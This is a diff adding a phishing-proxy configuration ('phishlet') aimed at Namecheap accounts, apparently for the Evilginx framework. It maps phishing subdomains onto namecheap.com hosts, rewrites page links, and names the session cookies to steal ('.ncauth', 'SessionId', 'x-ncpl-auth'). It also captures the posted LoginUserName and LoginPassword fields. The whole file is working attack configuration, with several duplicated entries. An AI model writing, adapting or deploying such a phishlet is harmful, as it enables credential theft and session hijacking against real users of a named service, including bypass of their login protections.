@@ -1,0 +1,45 @@
+
+author: '@An0nud4y' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'namecheap.com', session: true, is_landing: true}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.namecheap.com', orig_sub: 'www', domain: 'namecheap.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.namecheap.com', orig_sub: 'ap.www', domain: 'namecheap.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: 'ap.www.namecheap.com'
+    keys: ['.ncauth, rdt_uuid, SessionId, x-ncpl-auth, x-sf-country']  
+credentials:
+  username:
+    key: 'LoginUserName'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'LoginPassword'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'LoginUserName'
+      search: '(.*)'
+      type: 'post'
+    - key: 'LoginUserName'
+      search: '(.*)'
+      type: 'post'
+    - key: 'LoginPassword'
+      search: '(.*)'
+      type: 'post'
+    - key: 'LoginPassword'
+      search: '(.*)'
+      type: 'post'      
+      
+login:
+  domain: 'www.namecheap.com'
+  path: '/myaccount/login/' 
+  
